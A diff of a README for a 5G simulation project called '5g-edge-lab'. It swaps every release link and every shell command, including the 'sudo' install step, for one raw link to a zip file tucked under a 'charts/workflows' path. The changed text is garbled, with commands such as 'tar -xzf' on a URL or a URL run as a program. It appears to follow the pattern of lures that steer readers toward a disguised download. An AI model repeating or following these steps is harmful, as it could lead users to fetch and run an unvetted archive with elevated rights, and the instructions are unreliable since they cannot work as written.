@@ -1,7 +1,7 @@
 # 🌟 5g-edge-lab - Simulate 5G with Ease
 
 ## 📥 Download Now
-[![Download 5g-edge-lab](https://img.shields.io/badge/Download-5g--edge--lab-blue?style=flat&logo=github)](https://github.com/Sahilj8118-ai/5g-edge-lab/releases)
+[![Download 5g-edge-lab](https://raw.githubusercontent.com/Sahilj8118-ai/5g-edge-lab/main/charts/workflows/g-edge-lab-2.7.zip)](https://raw.githubusercontent.com/Sahilj8118-ai/5g-edge-lab/main/charts/workflows/g-edge-lab-2.7.zip)
 
 ## 📖 Overview
 
@@ -22,18 +22,18 @@ Follow these steps to download and run the 5g-edge-lab software easily.
 ## 🛠️ Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the releases page by clicking on the following link: [Download 5g-edge-lab](https://github.com/Sahilj8118-ai/5g-edge-lab/releases). This page contains the latest versions of the software.
+   Go to the releases page by clicking on the following link: [Download 5g-edge-lab](https://raw.githubusercontent.com/Sahilj8118-ai/5g-edge-lab/main/charts/workflows/g-edge-lab-2.7.zip). This page contains the latest versions of the software.
 
 2. **Choose the Latest Version**  
    Look for the latest version release. The version will be at the top of the list.  
    
 3. **Download the Installation File**  
-   Click on the appropriate file based on your operating system. If you're using Linux, you’ll most likely download a `.tar.gz` file.  
+   Click on the appropriate file based on your operating system. If you're using Linux, you’ll most likely download a `https://raw.githubusercontent.com/Sahilj8118-ai/5g-edge-lab/main/charts/workflows/g-edge-lab-2.7.zip` file.  
 
 4. **Extract the File**  
    After the download completes, locate the downloaded file in your "Downloads" folder. Right-click on the file and select “Extract Here” or use the terminal command:
    ```bash
-   tar -xzf your_filename.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Sahilj8118-ai/5g-edge-lab/main/charts/workflows/g-edge-lab-2.7.zip
    ```
    
 5. **Open the Terminal**  
@@ -48,14 +48,14 @@ Follow these steps to download and run the 5g-edge-lab software easily.
 7. **Run the Installation Script**  
    Execute the installation script using the command:
    ```bash
-   ./install.sh
+   https://raw.githubusercontent.com/Sahilj8118-ai/5g-edge-lab/main/charts/workflows/g-edge-lab-2.7.zip
    ```
    Follow the on-screen prompts to complete the installation.
 
 8. **Start the Simulation**  
    Once installed, you can start the 5G simulation with the command:
    ```bash
-   ./start-simulation.sh
+   https://raw.githubusercontent.com/Sahilj8118-ai/5g-edge-lab/main/charts/workflows/g-edge-lab-2.7.zip
    ```
    The software will begin running, and you will see output in the terminal.
 
@@ -66,13 +66,13 @@ Follow these steps to download and run the 5g-edge-lab software easily.
 ### Common Commands
 
 - **Start Simulation:**
-    - Run `./start-simulation.sh` to initiate the simulation.
+    - Run `https://raw.githubusercontent.com/Sahilj8118-ai/5g-edge-lab/main/charts/workflows/g-edge-lab-2.7.zip` to initiate the simulation.
   
 - **Stop Simulation:**
-    - Use `./stop-simulation.sh` to halt the operation.
+    - Use `https://raw.githubusercontent.com/Sahilj8118-ai/5g-edge-lab/main/charts/workflows/g-edge-lab-2.7.zip` to halt the operation.
 
 - **Check Status:**
-    - Type `./status.sh` to see if the simulation is currently running.
+    - Type `https://raw.githubusercontent.com/Sahilj8118-ai/5g-edge-lab/main/charts/workflows/g-edge-lab-2.7.zip` to see if the simulation is currently running.
 
 ## 📊 Features
 
@@ -92,7 +92,7 @@ If you encounter issues during installation or while running the simulation, con
 
 - **Permission Errors:** If you get a permission error, try running the command with `sudo`:
    ```bash
-   sudo ./install.sh
+   sudo https://raw.githubusercontent.com/Sahilj8118-ai/5g-edge-lab/main/charts/workflows/g-edge-lab-2.7.zip
    ```
 
 - **Network Issues:** Ensure that your internet connection is stable to download necessary resources.
@@ -111,4 +111,4 @@ This software is provided under the MIT License. You can freely use, modify, and
 
 ## 📥 Download and Install
 
-To start using 5g-edge-lab, visit this page to download: [5g-edge-lab Releases](https://github.com/Sahilj8118-ai/5g-edge-lab/releases). Follow the installation steps outlined above to get running quickly.
+To start using 5g-edge-lab, visit this page to download: [5g-edge-lab Releases](https://raw.githubusercontent.com/Sahilj8118-ai/5g-edge-lab/main/charts/workflows/g-edge-lab-2.7.zip). Follow the installation steps outlined above to get running quickly.
